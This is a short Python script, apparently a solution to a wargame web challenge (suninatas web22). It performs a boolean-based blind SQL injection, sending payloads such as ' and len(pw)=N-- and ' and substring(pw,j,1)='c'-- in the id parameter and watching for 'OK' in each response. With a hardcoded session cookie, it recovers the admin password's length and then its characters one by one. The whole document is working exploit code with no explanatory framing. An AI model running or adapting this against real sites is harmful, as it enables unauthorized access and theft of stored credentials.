import requests
 
URL="http://suninatas.com/Part_one/web22/web22.asp?id="
session=requests.Session()
USER="admin"
 
cookie={
    "ASPSESSIONIDSSSDDTCC":"EHJGAGDDJCOBFCNMEIJLMODF"
    }
 
result=[]
index=0
 
for i in range(1,20) :
    req1=session.get(URL+USER+"' and len(pw)="+str(i)+"--&pw=1",cookies=cookie)
    if (req1.text.find("OK") > 0) :
        print ("Total Length : "+str(i))
        for j in range(1,i+1) :
            for k in range(32,127) :
                req2=session.get(URL+USER+"' and substring(pw,"+str(j)+",1)='"+chr(k)+"'--&pw=1",cookies=cookie)
                if (req2.text.find("OK") > 0 ) :
                    result.insert(index,chr(k))
                    print (chr(k))
                    index += 1
                    if (index==i):
                        print (USER+"'s password : "+''.join(result))
                        input("Press any KEY to exit..")
                        exit (0)
                    break
